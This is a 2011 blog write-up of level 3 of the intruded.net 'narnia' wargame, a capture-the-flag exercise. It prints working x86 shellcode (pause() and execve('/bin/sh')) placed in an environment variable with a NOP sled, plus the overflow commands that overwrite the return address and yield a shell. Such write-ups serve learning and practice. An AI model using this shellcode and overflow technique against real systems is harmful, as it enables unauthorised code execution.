---
categories: capture the flag, wargames
date: 2011/09/20 22:58:41
guid: http://kenko.co/?p=43

tags: shellcode, intruded.net, narnia, x86
title: 'intruded.net, narnia: level 3'
permalink: intruded.net-narnia:-level-3
---
This time, we have something to do with a printf(). Thinking about this all day, I thought it would be a format string attack--alas, I was mistaken. Let's try the following:

[codebox 1]

After we get a segfault, you'll notice the %eip is strange:

[codebox 2]

Recall that the %eip is a 32-bit instruction pointer--we just set the next instruction to be run as 0x44444343. So, how does this help us? Clearly, we'll want to take advantage of this discovery to either get a shell or cat the .passwd file. 

Let's use what we have from level 2 and try to execute an environment variable. First, we'll need the address of the variable, EGG, because we like to reuse old names; creativity, and all.

[codebox 3]

Now, we just have to run the binary (/tmp/a.out, in my case--laziness) to find the address of EGG. Let's use the old shellcode of pause(), because it's easy to type out.

$$code(lang=bash)
level3@narnia:/tmp$ export EGG=`python -c 'print "\x90" * 14 + "\x31\xc0\xb0\x1d\xcd\x80"'` && ./a.out
0xbffffc41
level3@narnia:/tmp$ /wargame/level3 `python -c 'print "A" * 140 + "\x41\xfc\xff\xbf"'`
$$/code

Not sure why, yet, but 14 NOPs were needed for this to not crash down on me. Something else to add to my todo list, I suppose. Anyhow, let's replace the pause() for an execve()

$$code(lang=bash)
level3@narnia:/tmp$ export EGG=`python -c 'print "\x90" * 16 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42"'` && ./a.out
0xbffffc08
level3@narnia:/tmp$ /wargame/level3 `python -c 'print "A" * 140 + "\x08\xfc\xff\xbf"'`
sh-3.1$ 
$$/code

This time, 16 NOPs were needed. Why? <em>No</em> idea. 
At all.

Need to take a gander at the source once more, tomorrow evening.
